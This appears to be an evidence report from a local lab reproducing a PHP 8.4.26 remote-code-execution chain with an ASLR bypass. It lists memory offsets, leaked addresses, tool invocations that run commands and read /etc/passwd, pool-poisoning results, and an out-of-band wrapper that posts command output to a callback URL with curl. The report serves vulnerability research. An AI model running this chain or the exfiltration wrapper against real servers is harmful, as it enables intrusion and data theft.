# Evidence — official 8.4.26 target

All runs are local Docker targets. No live-target probing was performed.
Timestamps are UTC; logs were captured on 2026-10-23. The multi-worker
extension and its PID evidence are in `evidence/multi/` and summarized in
§3b.

**Advisory boundary.** PHP fixed both CVEs in **8.2.35, 8.3.36, 8.4.27, and
8.5.12**. `8.4.26` is the **last vulnerable 8.4 release**; `8.4.27` is the
**first fixed release**. This evidence covers the 8.4.26 point, not the full
advisory range. Patched releases are boundary controls, not targets; this
lab does not run them, so no experimental patch-boundary result is claimed.
Sources:
[PHP advisory](https://www.php.net/archive/2026.php#2026-10-21-5),
[GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w),
[GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp),
[CVE-2026-109618](https://www.cve.org/CVERecord?id=CVE-2026-109618),
[CVE-2026-109619](https://www.cve.org/CVERecord?id=CVE-2026-109619).

## 1. Target identity

From `evidence/target.txt`:

```
image:        php:8.4.26-apache
image_id:     sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a
repo_digest:  php@sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a
created:      2026-10-21T00:32:27Z
os:           Debian GNU/Linux 13 (trixie)
php:          8.4.26 NTS, 64-bit, cli/mod_php
apache:       Apache/2.4.69 (Debian), prefork, one worker, KeepAlive Off
libphp.so:    51663cf883b1223436d4c99f31dd0225735ea5573665e4242621eee7f4ee679c
zif_system:   libphp + 0x465370
zval_ptr_dtor: libphp + 0x65eb60
target page:  <?php echo "OK\n"; ?>
```

Stock `php.ini-production` values that matter:

```
display_errors = Off
memory_limit = 128M
post_max_size = 8M
output_buffering = 0
session.sid_length = 32
session.use_strict_mode = Off
```

The container's `/out` is bind-mounted from this directory's `out/` and is
writable by `www-data`:

```
Source: /home/ravhi/randoman/deepjb/php2shell-lab/official-lab/out
Destination: /out
RW: true
```

## 2. Reference chain (9bie `exploit.py`)

The public reference was run on a target of the same image and config before
the self-contained lab was started. All seven executions completed the chain
and produced a proof.

| # | Command | Log | Proof |
|---|---|---|---|
| 1 | `id>/out/p1` | `reference/our_repro_official_20261023_095438.log` | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` |
| 2 | `id>/out/p1` (same ASLR) | `reference/our_repro_same_aslr_t2.log` | same `uid=33` |
| 3 | `id>/out/p1` (same ASLR) | `reference/our_repro_same_aslr_t3.log` | same `uid=33` |
| 4 | `uname -a > /out/p1` | `reference/our_repro_cmd_uname.log` | `Linux 9b628de13de9 5.15.153.1-microsoft-standard-WSL2 … x86_64 GNU/Linux` |
| 5 | `cat /etc/passwd \| head -3 > /out/p1` | `reference/our_repro_cmd_passwd.log` | `root:x:0:0:root:/root:/bin/bash` + daemon + bin |
| 6 | `id; pwd > /out/p1 2>&1` | `reference/our_repro_cmd_idpwd.log` | `/var/www/html` only — the redirect applied only to `pwd`; `id` went to the response body |
| 7 | `rm -f /out/p1; (id; uname -a) > /out/p1 2>&1` | `reference/our_repro_cmd_wrapper.log` | both `uid=33…` and the kernel line |

Reference leak for all seven runs (same container/master):

```
decoded=819208
zval_ptr_dtor=0x7f9505e85b60
libphp=0x7f9505827000
zif_system=0x7f9505c8c370
main=0x7f9503c00000
S=0x7f9503cf8398
```

Run 6 is the reason the tool wraps commands in parentheses: shell
redirection binds to the last simple command unless the whole command is
grouped. Run 7 proves the grouped wrapper.

## 3. Interactive tool runs

After the parser fix, every command completed with a proof. The proof suffix
is the path the target wrote; the host read the same file from `out/`.

| # | Command | Log | Proof file | Output |
|---|---|---|---|---|
| 1 | `id` (first post-fix run) | `debug_first_try_parse_range_bug.log` (successful tail) | `o6bc74e74` | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` |
| 2 | `uname -a` | `pure_shell_uname.log` | `o2eaf2332` | `Linux 45649b436440 5.15.153.1-microsoft-standard-WSL2 … x86_64 GNU/Linux` |
| 3 | `cat /etc/passwd \| head -3` | `pure_shell_passwd.log` | `o34c3c719` | root, daemon, bin lines |
| 4 | `id; uname -a; pwd` | `pure_shell_multi.log` | `oc38f863e` | uid, kernel line, `/var/www/html` |
| 5 | `ls -la / \| head` | `pure_shell_ls.log` | `o43d95006` | 10-line root listing |
| 6 | REPL `exec id` | `pure_shell_repl.log` | `o74c34e46` | `uid=33…` |
| 7 | REPL `exec uname -a` | `pure_shell_repl.log` | `obe690e6a` | kernel line |
| 8 | REPL `shell` → `pwd` | `pure_shell_repl.log` | `ocdfc5055` | `/var/www/html` |
| 9 | REPL `shell` → `id` | `pure_shell_repl.log` | `oe3129a73` | `uid=33…` |
| 10 | `--restart auto` then `id` | `pure_shell_fresh_aslr.log` | `ofe9c9106` | `uid=33…` with new ASLR |
| 11 | `id` (clean rerun) | `pure_shell_id.log` | `oc7a062ac` | `uid=33…` |

Tool totals: **11/11 proof-producing commands**, plus one successful
leak-only run. The first pre-fix run failed 3/3 candidates and produced no
proof; it is retained as `debug_first_try_parse_range_bug.log`.

### Post-multi regression

After adding `--multi` and `multi_worker.py`, the default single-worker chain
was re-run on the official target:

```
command: id; uname -a
log:     tool_single_regression.log
proof:   o373671a0 (evidence/proof_single_regression.txt)
output:  uid=33(www-data) gid=33(www-data) groups=33(www-data)
         Linux 45649b436440 5.15.153.1-microsoft-standard-WSL2 ... x86_64 GNU/Linux
```

The first A1/B1 attempt returned no Set-Cookie (0 bytes); the second attempt
leaked and executed. That is the normal A1/B1 miss path, not a regression:
the single-worker chain still produces a proof after the multi changes.

### Post-TLS/OOB regression

After adding the TLS bridge and `--oob`, the default `/out` path was run
again on a freshly restarted target (`--restart auto`):

```
command: id; uname -a
log:     tool_single_final.log
proof:   o2e7b4073 (evidence/proof_single_final.txt)
leak:    zval_ptr_dtor=0x7f900d6e3b60 -> libphp=0x7f900d085000
         main=0x7f900b400000 S=0x7f900b4f8398 zif_system=0x7f900d4ea370
output:  uid=33(www-data) gid=33(www-data) groups=33(www-data)
         Linux bcbcbe31657c 5.15.153.1-microsoft-standard-WSL2 ... x86_64 GNU/Linux
```

The chain executed on the first try. The OOB and TLS runs use the same
`run_chain` path; only the command wrapper and transport differ.

## 3b. Multi-worker extension (bounded 4-worker lab)

The multi variant uses the same image (`sha256:60111400ff77…`), the same
stock ini, and the same offsets. Only prefork scheduling differs. Full
identity and PID logs are in `evidence/multi/`.

Target:

```
container:  p2s-multi-18112 (2ec475412566)
hostname:   2ec475412566
pool:       StartServers 4 / MaxRequestWorkers 4 / ServerLimit 4
keepalive:  On
out:        ./multi-out -> /out
php:        8.4.26 NTS; apache 2.4.69 prefork
ini:        display_errors=Off, memory_limit=128M, post_max_size=8M
```

Integrated command:

```
python3 pure_shell.py --port 18112 --multi --outdir multi-out --exec 'id'
```

Result (`evidence/multi/tool_multi_exec_id.log`):

```
[try 1/2] A1 4 concurrent: 3/4 500 + 1 transport error; B1 1/3..3/3 EOF
[try 2/2] A1 4 concurrent: 3/4 500 + 1 transport error
          B1 1/3: decoded=819208
          zval_ptr_dtor=0x7f53f7aa2b60 -> libphp=0x7f53f7444000
          main=0x7f53f5800000 S=0x7f53f58f8398 zif_system=0x7f53f78a9370
          A2 8 x 2: 16/16 500
          B2[1] status=EOF
[+] output (/out/o64bd996b):
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Proof: `evidence/multi/proof_tool_multi_id.txt` (copied from
`multi-out/o64bd996b`). PID evidence from
`evidence/multi/access_pids_fixed4.log`:

```
03:30:38-39  A1 x4   pid=49,50,51
03:31:40     B1      pid=50 200 (leak)
03:31:41     A2 x16  pid=50,51,52
03:31:42     B2      pid=50/51/52 (proof written; child closed)
```

Key negative and intermediate results:

| File | Result |
|---|---|
| `multi/experiments/keepalive_a1.log` | A1 on kept-alive socket: 500, `Connection: close` |
| `multi/experiments/solo_a2.log` | A2 alone: 500, `Connection: close` |
| `multi/experiments/pipeline_1.log` | pipelined A2+B2: A2 500, B2 EOF, no proof |
| `multi/experiments/poison_pid_1.log` | 4 A1s hit 19–22; B1 leaked from 20; 4 A2s hit 19–22; B2 hit fresh PID 32, no proof |
| `multi/experiments/a2b2_1.log` | 2 x 8 A2s covered the grown pool; B2 proof `uid=33` + `Linux 4f898675c501` |
| `multi/experiments/poison_pid_8_1.log` | one 8-connection A1 wave: B1 hit a new child and closed |
| `multi/tool_multi_leak_fixed4.log` | bounded pool, first B1 leak |
| `multi/tool_multi_official_single.log` | `--multi` on the single-worker official target: no leak; use the default mode |

The 8-worker-cap run showed the exact failure: A1 poisoned 19–22, B1 leaked
from 20, A2 poisoned 19–22, B2 landed on replacement child 32 and returned
the normal 3-byte page. Capping the pool at 4 (`MaxRequestWorkers 4`,
`ServerLimit 4`) and adding B1 retries fixed it. The error ledger is
`experiments/ERROR_LEDGER.md`.

## 3c. Remote-style delivery: out-of-band output and TLS

### Out-of-band output

The default `exec` reads the target's `/out` bind mount, which does not exist
on a remote target. `--oob URL` instead wraps the command as:

```
(CMD) > /tmp/.p2s 2>&1; curl -s --data-binary @/tmp/.p2s URL
```

The stock image has `/usr/bin/curl`; the callback is an ordinary HTTP POST.
The lab listener is `experiments/run_oob_listener.sh`: a second
`php:8.4.26-apache` container on the default bridge running PHP's built-in
server, capturing to `oob-out/oob.txt`.

| Run | Log | Capture | Source |
|---|---|---|---|
| single-worker | `tool_oob_id.log` | `oob_id.txt` | `172.17.0.2` |
| multi-worker (4 pool) | `multi/tool_multi_oob_id.log` | `multi/oob_multi_id.txt` | `172.17.0.3` |

Both captures contain:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The tool returned after B2 with `OOB callback dispatched`; it did not read
`/out`. The B2 status was `EOF` in the multi run; the callback is the success
signal.

### TLS

`--https` starts a loopback plain-TCP -> TLS bridge. The payloads are
unchanged; the bridge rewrites `Host`, applies SNI, and pumps both
directions. The TLS test used a raw TCP-level terminator
(`experiments/tls_tcp_forward.py`, TLS on `127.0.0.1:18444` -> plain HTTP
target on `127.0.0.1:18110`) so the chain's connection behavior is identical
to the plain path.

Separately, the nginx HTTP proxy was tested for the leak. Leak-only through
the nginx TLS HTTP proxy after the header-buffer fix
(`--port 18443 --https --insecure --leak`, `tool_tls_leak.log`):

```
TLS bridge 127.0.0.1:42807 -> 127.0.0.1:18443 (sni=127.0.0.1, verify off)
decoded=819208
zval_ptr_dtor=0x7fbbc8399b60 -> libphp=0x7fbbc7d3b000
chunk buckets: [('0x7fbbc5a00000', 7495), ('0x7fbbc8200000', 1095),
                ('0x7fbbc6000000', 87), ('0x7fbbc5800000', 79)]
```

Full chain plus OOB (`--port 18444 --https --insecure --oob ... --exec 'id'`,
`tool_tls_oob_id.log`):

```
TLS bridge 127.0.0.1:34427 -> 127.0.0.1:18444
decoded=819208
zval_ptr_dtor=0x7f16420c6b60 -> libphp=0x7f1641a68000
main=0x7f163fe00000 S=0x7f163fef8398 zif_system=0x7f1641ecd370
[+] OOB callback dispatched
```

Capture `oob_tls_id.txt`:

```
--- 172.17.0.2 POST / ---
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The TLS bridge leaks and executes with the same offsets and heap geometry;
only transport changes.

### HTTP reverse proxy caveat

`docker/nginx-tls.conf` terminates TLS and proxies to the target. The B1
response is ~1.68 MB, and its `Set-Cookie` header exceeds nginx's default
4–8 KB header buffer, so the proxy returns 502 (`upstream sent too big header
while reading response header from upstream`; `tls/nginx_p2s_tls.log`). Raising `proxy_buffer_size 4m` /
`proxy_buffers 8 4m` makes the leak succeed
(`tool_tls_leak.log` with `libphp=0x7fbbc7d3b000`), but the full chain
through this HTTP proxy is unstable: the target's child lifecycle changes and
the A1/B1 -> A2/B2 handoff often hits a respawned child. The validated
full-chain TLS path is the TCP-level terminator (or mod_ssl). The nginx
config and log are retained as the negative result.

The target identity is unchanged: image `sha256:60111400ff77…`, PHP 8.4.26
NTS, Apache 2.4.69 prefork, stock ini. The container was recreated/restarted
for fresh ASLR during these runs; `tls/target_tls.txt` records the current
container and networks. A transient `docker exec` failure after the restart
is visible there; the target served the chain, and the image digest is the
stable identity.

## 4. Runtime ASLR resolution

Generation A (before restart):

```
zval_ptr_dtor=0x7f7ef2d1fb60
libphp=0x7f7ef26c1000
zif_system=0x7f7ef2b26370
main=0x7f7ef0a00000
S=0x7f7ef0af8398
```

Generation B (after `--restart auto`):

```
zval_ptr_dtor=0x7f5868e12b60
libphp=0x7f58687b4000
zif_system=0x7f5868c19370
main=0x7f5866c00000
S=0x7f5866cf8398
```

The `libphp` base changed by a large ASLR slide; the chain re-leaked it from
the B1 cookie and executed `id` again. No hardcoded base was reused.

## 5. Leak-only run

`evidence/pure_shell_leak.log`:

```
decoded=819208
zval_ptr_dtor=0x7f7ef2d1fb60 -> libphp=0x7f7ef26c1000
chunk buckets:
  0x7f7ef0400000  7495
  0x7f7ef2c00000  1095
  0x7f7ef0a00000    87
  0x7f7ef0200000    79
```

The 87-count bucket is the main chunk; the 79-count bucket is the alternate
candidate. The tool ranks candidates by `abs(count - 87)` and tries up to
three.

## 6. Verification commands

```bash
# from the repository root
cd official-lab

# target up and stock config
./run.sh

# identity
docker exec "$(docker ps -q --filter publish=18110)" php -v
docker exec "$(docker ps -q --filter publish=18110)" apache2 -v

# runtime leak
python3 pure_shell.py --leak

# execution
python3 pure_shell.py --exec 'id'
python3 pure_shell.py --exec 'uname -a'

# fresh ASLR
python3 pure_shell.py --restart auto --exec 'id'

# reference (optional; clone 9bie/php2shell-bypass-aslr-exp as ../exploits/9bie-latest)
python3 ../exploits/9bie-latest/exploit.py --port 18110 --docker docker \
  --restart "$(docker ps -q --filter publish=18110)"
```

## 7. Integrity

```
fb7945d36486b281ed385b13ed51720aa276fff2eac12d95a1f7e4c886393761  pure_shell.py
835b628ecfb7f5300c3d66d5af60d85ef7ce2988a379b92a8c7dcc87066f1711  multi_worker.py
24320e5b0490aef77caf5e8c6a90c753f909573582f6f4027fd71ed04c2f66be  run.sh
7217a14699d8ada240b31670d44ca8697d2c778ef7cb459b6ad31fc707cef8e5  run_multi.sh
4abec605a47b0597f81ff4f4f6acfa58af99099f7f66806776415936856b7235  docker/apache-multi.conf
21703d28719610e5bab2c74b53c13f0fcdc51119c6821e1f3fcf32387645cab8  docker/apache.conf
04245f280ca6bc424e4498096e69b3b6cfcc62bdad9b4c5f3b834b019976f31c  docker/nginx-tls.conf
fb6c21c8731c621aebe0436e02bb59ddc3566c8782e4d7330e69a5c3bc898d49  docker/www/pid.php
021bdabad40d3186018be1619a40e1e95355c187fc6f1ba6c68ba1e5629eb438  payloads/cheap_oom_a.py
83e95e43f36ecd7c99c719e405286e8f0f6e9411d24f402b7824f932493725fe  payloads/chunked_send.py
30d131936d0d14fb9756fc525095d93a4cdb1f5315dd1ef56ec2a07f78a4e7d7  payloads/fake_ref_b.py
46fa8b5dcd3083d235da88ce57e74189b89497240fbe157be1a0277b9a4ec845  payloads/mk_a1.py
52af7e4a14b5265149af63fc10c12b9d7b8ce181d592cb694fa94fa4c125dff1  payloads/mk_ht.py
1fb3e307ae96030eeba77aff6ecd6d08202e75e6d09d416e7f0c71d9e96a78f1  payloads/mk_leak_b.py
b0056b84e74195f43ecf330bed345be87013b12b259d123fd1fba2f5aa7b2244  experiments/ERROR_LEDGER.md
3a626f1b95389cf259f4f8137ffc1df489f3cae51df0b75c795dcdd4a1d7a032  experiments/oob_listener.php
8ef1f22c146f8869f7ae8863eb5b27937790b34c34d3bc73b2dc880562c6f50b  experiments/run_oob_listener.sh
ae59cc26754dce9b491f3944a22a9e7dfac8c2e25e55f27196b4b9a2ed2db592  experiments/run_tls_proxy.sh
e52cd6e6a63db42eb72b24bbdcaea41180cc8f08adb8ebc1b5ed30f715892a58  experiments/tls_tcp_forward.py
e3e0345db91b9f708d587c3a834e50d36e5747368f8a47ac873dca4962ee6342  evidence/multi/README.md
```
